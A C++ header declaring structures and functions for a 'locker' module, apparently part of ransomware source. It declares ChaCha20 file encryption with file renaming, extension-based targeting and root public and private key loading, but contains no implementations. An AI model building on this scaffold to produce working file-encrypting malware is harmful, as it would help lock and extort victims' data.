#ifndef _LOCKER_H_
#define _LOCKER_H_

#include "macro.h"
#include "pathsystem.h"
#include "chacha20/ecrypt-sync.h"

namespace locker
{
	typedef struct file_info
	{
		laced_ctx CryptCtx;
		LPCWSTR Filename;
		WCHAR* newFilename;
		LPCWSTR FilePath;
		HANDLE FileHandle;
		HANDLE newFileHandle;
		LONGLONG Filesize;		
		DWORD bit;
	}FILE_INFO, * PFILE_INFO;
	
	typedef struct HashList
	{		
		BYTE* hash;
		size_t hash_size;
		SLIST_ENTRY(HashList);
	} *PHLIST, HLIST;


	
	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList);
	BOOL HandlerASymmetricGenKey();

	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
}

typedef locker::HLIST HASH_LIST;
typedef locker::HLIST* PHASH_LIST;


#endif